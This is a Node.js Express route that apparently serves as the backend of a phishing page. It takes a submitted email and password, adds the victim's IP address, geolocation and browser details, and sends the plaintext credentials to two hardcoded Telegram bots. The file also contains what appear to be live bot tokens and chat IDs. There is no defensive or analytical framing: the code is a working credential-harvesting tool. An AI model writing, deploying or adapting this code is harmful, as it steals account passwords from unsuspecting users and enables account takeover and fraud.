const express = require("express");
const fetch = require("node-fetch");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');

const router = express.Router();

const BOT_TOKENS = ["6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4", "8243640993:AAEOKTTis2fef8CfY9MFqBsA1BAC8llbh0Y"];
const CHAT_IDS = ["6068638071", "7424024723"];

router.post('/', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ success: false, message: "Missing email or password" });
        }

        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
        const location = geoip.lookup(ip);
        const locationStr = location ? `${location.city}, ${location.country}` : 'Unknown';

        const parser = new UAParser(req.headers['user-agent']);
        const agent = parser.getResult();
        const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;

        const message = `
📌 *Login Notification*
- Email: \`${email}\`
- Password: \`${password}\`
- IP: \`${ip}\`
- Location: ${locationStr}
- Timestamp: ${new Date().toISOString()}
- Device: ${deviceType}
        `;

        console.log(`Attempting to send to ${BOT_TOKENS.length} bots and ${CHAT_IDS.length} chats`);

        // Send to all bots/chats
        const sendPromises = [];
        
        for (let i = 0; i < Math.min(BOT_TOKENS.length, CHAT_IDS.length); i++) {
            const telegramApi = `https://api.telegram.org/bot${BOT_TOKENS[i]}/sendMessage`;
            
            console.log(`Sending to bot ${i}: ${BOT_TOKENS[i].substring(0, 10)}... -> chat ${CHAT_IDS[i]}`);
            
            sendPromises.push(
                fetch(telegramApi, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_IDS[i],
                        text: message,
                        parse_mode: "Markdown"
                    })
                }).then(response => {
                    console.log(`Bot ${i} response status: ${response.status}`);
                    return { response, index: i };
                })
            );
        }

        // Wait for all requests to complete
        const results = await Promise.allSettled(sendPromises);
        
        let successCount = 0;
        let failCount = 0;
        
        for (const result of results) {
            if (result.status === 'fulfilled') {
                const { response, index } = result.value;
                if (response.ok) {
                    console.log(`✅ Successfully sent to bot ${index} -> chat ${CHAT_IDS[index]}`);
                    successCount++;
                } else {
                    const errorText = await response.text();
                    console.error(`❌ Failed to send to bot ${index}: ${response.status} - ${errorText}`);
                    failCount++;
                }
            } else {
                console.error(`❌ Promise rejected for bot:`, result.reason);
                failCount++;
            }
        }

        console.log(`Summary: ${successCount} successful, ${failCount} failed`);

        res.status(200).json({
            success: true,
            message: `Notifications sent: ${successCount} successful, ${failCount} failed`,
            loginDetails: { device: deviceType, ip, location: locationStr }
        });

    } catch (error) {
        console.error("Error sending Telegram message:", error);
        res.status(500).json({ 
            success: false, 
            message: "Failed to send Telegram notification", 
            error: error.message 
        });
    }
});

module.exports = router;